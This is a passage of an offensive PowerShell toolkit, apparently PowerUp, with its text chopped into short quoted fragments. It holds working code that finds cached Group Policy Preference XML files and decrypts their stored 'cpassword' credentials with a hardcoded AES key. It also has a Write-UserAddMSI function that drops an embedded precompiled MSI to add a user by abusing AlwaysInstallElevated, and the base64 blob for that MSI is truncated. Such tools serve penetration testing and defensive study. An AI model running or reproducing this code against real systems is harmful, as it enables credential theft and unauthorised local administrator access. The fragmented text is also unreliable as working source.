      ','      $Mod =',' ($Cpassword','.length % 4)','

          ','  switch ($M','od) {
      ','          ''1',''' {$Cpasswor','d = $Cpasswo','rd.Substring','(0,$Cpasswor','d.Length -1)','}
          ','      ''2'' {$','Cpassword +=',' (''='' * (4 -',' $Mod))}
   ','            ',' ''3'' {$Cpass','word += (''=''',' * (4 - $Mod','))}
        ','    }

     ','       $Base','64Decoded = ','[Convert]::F','romBase64Str','ing($Cpasswo','rd)

       ','     # Creat','e a new AES ','.NET Crypto ','Object
     ','       $AesO','bject = New-','Object Syste','m.Security.C','ryptography.','AesCryptoSer','viceProvider','
           ',' [Byte[]] $A','esKey = @(0x','4e,0x99,0x06',',0xe8,0xfc,0','xb6,0x6c,0xc','9,0xfa,0xf4,','0x93,0x10,0x','62,0x0f,0xfe',',0xe8,
     ','            ','            ','    0xf4,0x9','6,0xe8,0x06,','0xcc,0x05,0x','79,0x90,0x20',',0x9b,0x09,0','xa4,0x33,0xb','6,0x6c,0x1b)','

          ','  # Set IV t','o all nulls ','to prevent d','ynamic gener','ation of IV ','value
      ','      $AesIV',' = New-Objec','t Byte[]($Ae','sObject.IV.L','ength)
     ','       $AesO','bject.IV = $','AesIV
      ','      $AesOb','ject.Key = $','AesKey
     ','       $Decr','yptorObject ','= $AesObject','.CreateDecry','ptor()
     ','       [Byte','[]] $OutBloc','k = $Decrypt','orObject.Tra','nsformFinalB','lock($Base64','Decoded, 0, ','$Base64Decod','ed.length)

','            ','return [Syst','em.Text.Unic','odeEncoding]','::Unicode.Ge','tString($Out','Block)
     ','   }

      ','  catch {
  ','          Wr','ite-Error $E','rror[0]
    ','    }
    }
','
    # helpe','r that parse','s fields fro','m the found ','xml preferen','ce files
   ',' function lo','cal:Get-GPPI','nnerField {
','        [Dia','gnostics.Cod','eAnalysis.Su','ppressMessag','eAttribute(''','PSShouldProc','ess'', '''')]
 ','       [Cmdl','etBinding()]','
        Par','am(
        ','    $File
  ','      )

   ','     try {
 ','           $','Filename = S','plit-Path $F','ile -Leaf
  ','          [X','ML] $Xml = G','et-Content (','$File)

    ','        $Cpa','ssword = @()','
           ',' $UserName =',' @()
       ','     $NewNam','e = @()
    ','        $Cha','nged = @()
 ','           $','Password = @','()

        ','    # check ','for password',' field
     ','       if ($','Xml.innerxml',' -like "*cpa','ssword*"){

','            ','    Write-Ve','rbose "Poten','tial passwor','d in $File"
','
           ','     switch ','($Filename) ','{
          ','          ''G','roups.xml'' {','
           ','            ',' $Cpassword ','+= , $Xml | ','Select-Xml "','/Groups/User','/Properties/','@cpassword" ','| Select-Obj','ect -Expand ','Node | ForEa','ch-Object {$','_.Value}
   ','            ','         $Us','erName += , ','$Xml | Selec','t-Xml "/Grou','ps/User/Prop','erties/@user','Name" | Sele','ct-Object -E','xpand Node |',' ForEach-Obj','ect {$_.Valu','e}
         ','            ','   $NewName ','+= , $Xml | ','Select-Xml "','/Groups/User','/Properties/','@newName" | ','Select-Objec','t -Expand No','de | ForEach','-Object {$_.','Value}
     ','            ','       $Chan','ged += , $Xm','l | Select-X','ml "/Groups/','User/@change','d" | Select-','Object -Expa','nd Node | Fo','rEach-Object',' {$_.Value}
','            ','        }

 ','            ','       ''Serv','ices.xml'' {
','            ','            ','$Cpassword +','= , $Xml | S','elect-Xml "/','NTServices/N','TService/Pro','perties/@cpa','ssword" | Se','lect-Object ','-Expand Node',' | ForEach-O','bject {$_.Va','lue}
       ','            ','     $UserNa','me += , $Xml',' | Select-Xm','l "/NTServic','es/NTService','/Properties/','@accountName','" | Select-O','bject -Expan','d Node | For','Each-Object ','{$_.Value}
 ','            ','           $','Changed += ,',' $Xml | Sele','ct-Xml "/NTS','ervices/NTSe','rvice/@chang','ed" | Select','-Object -Exp','and Node | F','orEach-Objec','t {$_.Value}','
           ','         }

','            ','        ''Sch','eduledtasks.','xml'' {
     ','            ','       $Cpas','sword += , $','Xml | Select','-Xml "/Sched','uledTasks/Ta','sk/Propertie','s/@cpassword','" | Select-O','bject -Expan','d Node | For','Each-Object ','{$_.Value}
 ','            ','           $','UserName += ',', $Xml | Sel','ect-Xml "/Sc','heduledTasks','/Task/Proper','ties/@runAs"',' | Select-Ob','ject -Expand',' Node | ForE','ach-Object {','$_.Value}
  ','            ','          $C','hanged += , ','$Xml | Selec','t-Xml "/Sche','duledTasks/T','ask/@changed','" | Select-O','bject -Expan','d Node | For','Each-Object ','{$_.Value}
 ','            ','       }

  ','            ','      ''DataS','ources.xml'' ','{
          ','            ','  $Cpassword',' += , $Xml |',' Select-Xml ','"/DataSource','s/DataSource','/Properties/','@cpassword" ','| Select-Obj','ect -Expand ','Node | ForEa','ch-Object {$','_.Value}
   ','            ','         $Us','erName += , ','$Xml | Selec','t-Xml "/Data','Sources/Data','Source/Prope','rties/@usern','ame" | Selec','t-Object -Ex','pand Node | ','ForEach-Obje','ct {$_.Value','}
          ','            ','  $Changed +','= , $Xml | S','elect-Xml "/','DataSources/','DataSource/@','changed" | S','elect-Object',' -Expand Nod','e | ForEach-','Object {$_.V','alue}
      ','            ','  }

       ','            ',' ''Printers.x','ml'' {
      ','            ','      $Cpass','word += , $X','ml | Select-','Xml "/Printe','rs/SharedPri','nter/Propert','ies/@cpasswo','rd" | Select','-Object -Exp','and Node | F','orEach-Objec','t {$_.Value}','
           ','            ',' $UserName +','= , $Xml | S','elect-Xml "/','Printers/Sha','redPrinter/P','roperties/@u','sername" | S','elect-Object',' -Expand Nod','e | ForEach-','Object {$_.V','alue}
      ','            ','      $Chang','ed += , $Xml',' | Select-Xm','l "/Printers','/SharedPrint','er/@changed"',' | Select-Ob','ject -Expand',' Node | ForE','ach-Object {','$_.Value}
  ','            ','      }

   ','            ','     ''Drives','.xml'' {
    ','            ','        $Cpa','ssword += , ','$Xml | Selec','t-Xml "/Driv','es/Drive/Pro','perties/@cpa','ssword" | Se','lect-Object ','-Expand Node',' | ForEach-O','bject {$_.Va','lue}
       ','            ','     $UserNa','me += , $Xml',' | Select-Xm','l "/Drives/D','rive/Propert','ies/@usernam','e" | Select-','Object -Expa','nd Node | Fo','rEach-Object',' {$_.Value}
','            ','            ','$Changed += ',', $Xml | Sel','ect-Xml "/Dr','ives/Drive/@','changed" | S','elect-Object',' -Expand Nod','e | ForEach-','Object {$_.V','alue}
      ','            ','  }
        ','        }
  ','         }

','           F','orEach ($Pas','s in $Cpassw','ord) {
     ','          Wr','ite-Verbose ','"Decrypting ','$Pass"
     ','          $D','ecryptedPass','word = Get-D','ecryptedCpas','sword $Pass
','            ','   Write-Ver','bose "Decryp','ted a passwo','rd of $Decry','ptedPassword','"
          ','     #append',' any new pas','swords to ar','ray
        ','       $Pass','word += , $D','ecryptedPass','word
       ','    }

     ','       # put',' [BLANK] in ','variables
  ','          if',' (-not $Pass','word) {$Pass','word = ''[BLA','NK]''}
      ','      if (-n','ot $UserName',') {$UserName',' = ''[BLANK]''','}
          ','  if (-not $','Changed)  {$','Changed = ''[','BLANK]''}
   ','         if ','(-not $NewNa','me)  {$NewNa','me = ''[BLANK',']''}

       ','     # Creat','e custom obj','ect to outpu','t results
  ','          $O','bjectPropert','ies = @{''Pas','swords'' = $P','assword;
   ','            ','            ','       ''User','Names'' = $Us','erName;
    ','            ','            ','      ''Chang','ed'' = $Chang','ed;
        ','            ','            ','  ''NewName'' ','= $NewName;
','            ','            ','          ''F','ile'' = $File','}

         ','   $ResultsO','bject = New-','Object -Type','Name PSObjec','t -Property ','$ObjectPrope','rties
      ','      Write-','Verbose "The',' password is',' between {} ','and may be m','ore than one',' value."
   ','         if ','($ResultsObj','ect) { Retur','n $ResultsOb','ject }
     ','   }

      ','  catch {Wri','te-Error $Er','ror[0]}
    ','}

    try {','
        $Al','lUsers = $En','v:ALLUSERSPR','OFILE

     ','   if ($AllU','sers -notmat','ch ''ProgramD','ata'') {
    ','        $All','Users = "$Al','lUsers\Appli','cation Data"','
        }

','        # di','scover any l','ocally cache','d GPP .xml f','iles
       ',' $XMlFiles =',' Get-ChildIt','em -Path $Al','lUsers -Recu','rse -Include',' ''Groups.xml',''',''Services.','xml'',''Schedu','ledtasks.xml',''',''DataSourc','es.xml'',''Pri','nters.xml'',''','Drives.xml'' ','-Force -Erro','rAction Sile','ntlyContinue','

        if',' ( -not $XMl','Files ) {
  ','          Wr','ite-Verbose ','''No preferen','ce files fou','nd.''
       ',' }
        e','lse {
      ','      Write-','Verbose "Fou','nd $($XMLFil','es | Measure','-Object | Se','lect-Object ','-ExpandPrope','rty Count) f','iles that co','uld contain ','passwords."
','
           ',' ForEach ($F','ile in $XMLF','iles) {
    ','            ','Get-GppInner','Field $File.','Fullname
   ','         }
 ','       }
   ',' }

    catc','h {
        ','Write-Error ','$Error[0]
  ','  }
}


func','tion Write-U','serAddMSI {
','<#
.SYNOPSIS','

Writes out',' a precompil','ed MSI insta','ller that pr','ompts for a ','user/group a','ddition.
Thi','s function c','an be used t','o abuse Get-','RegistryAlwa','ysInstallEle','vated.

Auth','or: Will Sch','roeder (@har','mj0y)  
Lice','nse: BSD 3-C','lause  
Requ','ired Depende','ncies: None ',' 

.DESCRIPT','ION

Writes ','out a precom','piled MSI in','staller that',' prompts for',' a user/grou','p addition.
','This functio','n can be use','d to abuse G','et-RegistryA','lwaysInstall','Elevated.

.','EXAMPLE

Wri','te-UserAddMS','I

Writes th','e user add M','SI to the lo','cal director','y.

.OUTPUTS','

PowerUp.Us','erAddMSI
#>
','
    [Diagno','stics.CodeAn','alysis.Suppr','essMessageAt','tribute(''PSS','houldProcess',''', '''')]
    ','[OutputType(','''ServiceProc','ess.UserAddM','SI'')]
    [C','mdletBinding','()]
    Para','m(
        [','Parameter(Po','sition = 0, ','ValueFromPip','eline = $Tru','e, ValueFrom','PipelineByPr','opertyName =',' $True)]
   ','     [Alias(','''ServiceName',''')]
        ','[String]
   ','     [Valida','teNotNullOrE','mpty()]
    ','    $Path = ','''UserAdd.msi','''
    )

   ',' $Binary = ''','0M8R4KGxGuEA','AAAAAAAAAAAA','AAAAAAAAPgAE','AP7/DAAGAAAA','AAAAAAEAAAAB','AAAAAQAAAAAA','AAAAEAAAAgAA','AAEAAAD+////','AAAAAAAAAAD/','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','//////////8A','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AP3////+////','/v///y8AAAAF','AAAABgAAAP7/','//8IAAAACQAA','AAoAAAALAAAA','DAAAAA0AAAAO','AAAADwAAABAA','AAARAAAAEgAA','ABMAAAAUAAAA','FQAAACwAAAAY','AAAAFgAAABkA','AAAaAAAAGwAA','ABwAAAAdAAAA','HgAAAB8AAAAg','AAAAIQAAACIA','AAAjAAAAJAAA','ACUAAAAmAAAA','JwAAACgAAAAp','AAAAKgAAACsA','AAD+////LQAA','AC4AAAAwAAAA','/v///zEAAAD+','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','////////////','//9SAG8AbwB0','ACAARQBuAHQA','cgB5AAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAFgAFAP//','////////AgAA','AIQQDAAAAAAA','wAAAAAAAAEYA','AAAAAAAAAAAA','AABQSJaT62LP','AQMAAABAFwAA','AAAAAAUAUwB1','AG0AbQBhAHIA','eQBJAG4AZgBv','AHIAbQBhAHQA','aQBvAG4AAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAoAAIB','EAAAABkAAAD/','////AAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAANgB','AAAAAAAAQEj/','P+RD7EHkRaxE','MUgAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAABAA','AgEVAAAAAwAA','AP////8AAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAJAAAA','EAgAAAAAAABA','SMpBMEOxOztC','JkY3QhxCNEZo','RCZCAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','GAACAQQAAAAB','AAAA/////wAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAACoA','AAAwAAAAAAAA','AEBIykEwQ7E/','Ej8oRThCsUEo','SAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAUAAIBEgAA','AA0AAAD/////','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','KwAAABgAAAAA','AAAAQEjKQflF','zkaoQfhFKD8o','RThCsUEoSAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAABgAAgH/','////////////','//8AAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAsAAAAKgAA','AAAAAABASAtD','MUE1RwAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAACgAC','ARMAAAAWAAAA','/////wAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAFkAAAAI','AAAAAAAAAEBI','fz9kQS9CNkgA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAM','AAIBBgAAAAwA','AAD/////AAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAWgAA','ACYAAAAAAAAA','C0MxQTVHfkG9','RwxG9kUyRIpB','N0NyRM1DL0gA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','ABwAAgH/////','DwAAAP////8A','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAX','AAAAAFgBAAAA','AABASIxE8ERy','RGhEN0gAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAADgACAP//','////////////','/wAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AC4AAAAMAAAA','AAAAAEBIDEb2','RTJEikE3Q3JE','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAQAAIA','////////////','////AAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAALwAAADwA','AAAAAAAAQEgN','QzVC5kVyRTxI','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAA4A','AgEOAAAAGAAA','AP////8AAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAwAAAA','EgAAAAAAAABA','SA9C5EV4RShI','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','DAACAP//////','/////////wAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAADEA','AAAQAAAAAAAA','AEBID0LkRXhF','KDsyRLNEMULx','RTZIAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAWAAIB////','/xEAAAD/////','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','AAAAAAAAAAAA','MgAAAAQAAAAA','AAAAQEhZRfJE','aEU3RwAAAAAA','AAAAAAAAAAAA','AAAA